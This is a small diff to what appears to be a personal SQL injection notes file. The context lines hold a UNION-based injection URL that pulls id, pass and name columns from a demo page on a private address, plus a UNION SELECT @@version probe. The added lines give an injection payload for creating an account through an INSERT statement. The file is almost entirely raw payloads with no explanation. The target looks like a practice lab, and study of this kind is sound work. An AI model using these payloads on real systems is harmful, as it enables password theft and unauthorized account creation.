@@ -466,3 +466,10 @@ http://10.50.42.112/uniondemo.php?Selection=2 UNION select id,pass,name from ses
 
 
 UNION SELECT 1,2,@@version --- to get the version
+
+
+------------
+ admin Account creating  syntax
+
+User6', 'a', 'b',1) #
+---------
